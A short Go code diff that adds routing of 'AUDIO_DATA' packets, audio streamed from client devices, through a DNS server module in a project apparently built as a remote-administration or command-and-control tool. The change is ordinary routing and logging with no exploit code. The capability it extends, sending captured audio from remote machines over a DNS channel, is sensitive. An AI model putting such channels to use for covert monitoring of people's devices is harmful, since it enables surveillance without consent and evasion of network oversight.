@@ -3,6 +3,8 @@ package dns
 import (
 	"Spark/modules"
 	"Spark/server/common"
+	"Spark/server/handler/audio"
+	"Spark/server/handler/utility"
 	"Spark/utils"
 	"Spark/utils/cmap"
 	"context"
@@ -20,8 +22,6 @@ import (
 	"go.opentelemetry.io/otel"
 	"go.opentelemetry.io/otel/attribute"
 	"golang.org/x/time/rate"
-
-	"Spark/server/handler/utility"
 )
 
 const (
@@ -509,6 +509,15 @@ func (s *DNSServer) routePacket(uuid string, packet *modules.Packet) error {
 	common.Info(nil, "DNS_PACKET_RECEIVED", uuid, packet.Act, map[string]any{
 		"packet_act": packet.Act,
 	})
+
+	// Handle AUDIO_DATA packets (streaming audio from client)
+	if packet.Act == `AUDIO_DATA` {
+		if err := audio.HandleAudioData(*packet, uuid); err != nil {
+			common.Warn(nil, "DNS_AUDIO_DATA_ERROR", uuid, err.Error(), nil)
+			return err
+		}
+		return nil
+	}
 
 	// Handle DEVICE_UP and DEVICE_UPDATE packets specially (same as WebSocket)
 	if packet.Act == `DEVICE_UP` || packet.Act == `DEVICE_UPDATE` {
